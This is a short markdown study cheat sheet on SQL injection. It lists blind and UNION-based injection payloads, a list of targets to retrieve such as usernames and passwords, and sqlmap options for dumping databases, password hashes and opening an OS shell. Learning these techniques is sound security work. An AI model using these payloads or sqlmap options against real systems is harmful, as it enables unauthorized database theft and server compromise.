# SQL Injection (SQLi)
---
[Small SQLi Scanner](https://github.com/stamparm/DSSS)
[Check for SQLi online](https://suip.biz/?act=sqlmap)
* One can understand the query structure by fuzzing with ' " / \ and reading the errors
[Small payload](https://github.com/payloadbox/sql-injection-payload-list#generic-sql-injection-payloads)
## Blind SQLi
* Blind SQLi, when we see a change in output if the DB returns false, or vice-versa
* In SQL there is a function called substr("String", start, len)
* 1' substr((select database()),1,1)) = s --+
* Find the name of the DB by comaring it to letters and see if it returns true or false
* Or do binary seach using < or > like
* 1' AND (ascii(substr((select database()),2,1))) < 115 --+

## UNION Based
* Find the number of columns
```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
# and so on until an error occurs or
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
# until the error occurs
```
* Find column containing string
```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

Here's a small list of thing you'd want to retrieve:
1. *database()*
2. *user()*
3. *@@version*
4. *username*
5. *password*
6. *table_name*
7. *column_name*

## sqlmap

### Options
-u -> Targe URL
--dbms -> provide db (MySQL, PostgreSQL)
--level -> 1-5, level of tests
--risk -> 1-3
-r -> request (taken from Burp)

### Enumeration
--dump and --dump-all -> retrieve DBMS db
--password -> enumerate DBMS users password hashes
--all
--dbs -> list all databases

### OS interation
--os-shell -> interactive OS shell
--os-pwn -> Meterpreter or something

### Additional
--batch -> don't ask for user input, use default
--wizard -> simple interface for beginners

[Cheat sheet](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
[Command list](https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet)

